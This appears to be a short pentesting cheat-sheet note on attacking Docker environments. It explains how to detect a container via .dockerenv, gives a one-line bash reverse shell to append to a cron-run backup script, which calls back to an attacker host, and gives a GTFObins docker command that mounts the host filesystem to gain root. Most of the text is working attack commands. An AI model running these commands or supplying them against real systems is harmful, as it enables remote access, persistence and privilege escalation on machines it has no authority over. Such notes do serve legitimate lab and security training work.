---
title: Docker hacking 🐳
---

- If we find a `.dockerenv` file in the root directory, we are running inside a docker container

![](Pasted%20image%2020240215214817.png)

- If we find a `.sh` on the `/opt/backups` directory like a backup script that might be running a cron job, we can try to write a reverse shell to it:

```shell
echo "bash -i >& /dev/tcp/IP_ATTCK/PORT 0>&1" >> backup.sh
```

## Being part of the docker group

- If we find out that our victim user belongs to the docker group, we can do the following (based on [GTFObins](https://gtfobins.github.io/gtfobins/docker/)):

```shell
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

![](Pasted%20image%2020240417222812.png)

![](Pasted%20image%2020240417222753.png)

